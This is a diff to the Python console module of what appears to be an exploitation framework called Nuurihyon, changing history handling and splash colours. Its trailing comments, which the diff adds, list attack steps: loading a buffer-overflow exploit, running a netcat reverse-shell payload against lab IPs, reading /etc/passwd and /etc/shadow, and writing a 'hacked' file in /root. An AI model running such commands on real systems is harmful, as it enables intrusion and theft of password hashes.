@@ -13,8 +13,8 @@ class Nuurihyon(engine.Engine):
     MODREF: str = "nuurihyon"
     MODNAME: str = "Nuurihyon"
     AUTHOR: str = "Danakane"
-    HISTFILE: str = ".history/nuurihyon.hist"
     ROOTDIR: str = str(pathlib.Path(__file__).resolve().parent)
+    HISTFILE: str = ROOTDIR + "/.history/nuurihyon.hist"
     HISTLEN: int = 1000
 
     def __init__(self)->None:
@@ -89,15 +89,14 @@ class Nuurihyon(engine.Engine):
 
     def stop(self)->None:
         try:
-            readline.append_history_file(readline.get_current_history_length() -
-                                         self.__histlen__, Nuurihyon.HISTFILE)
+            readline.write_history_file(Nuurihyon.HISTFILE)
         except FileNotFoundError:
             pass
 
     def splash(self)->None:
-        colors: typing.List[typing.Callable] = [style.Style.red, style.Style.yellow, style.Style.blue,
+        colors: typing.List[typing.Callable] = [style.Style.red, style.Style.yellow, style.Style.darkcyan,
                                                 style.Style.cyan, style.Style.green]
-        print(hata.Hata.flag() + " by " + random.choice(colors)(self.author), end="\n\n")
+        print(hata.Hata.flag() + " by " + style.Style.bold(random.choice(colors)(self.author)), end="\n\n")
 
 
 blueprint: typing.Callable = Nuurihyon
@@ -112,6 +111,8 @@ if __name__ == '__main__':
 
 # load linux_x64_ovrflwmyechosrv
 # run payload reverse/linux_netcat rhost 192.168.56.103 rport 1025 lhost 192.168.56.102 lport 4444
-# touch /root/hacked.txt
-# gnome-terminal -x bash -c "tailf -n 1 /root/hacked.txt"
-# echo "You have been hacked :)" >> /root/hacked.txt
+# cat /etc/passwd
+# cat /etc/shadow
+# touch /root/sploited.txt
+# gnome-terminal -- tail -f -n 1 /root/sploited.txt
+# echo "You have been hacked :)" >> /root/sploited.txt
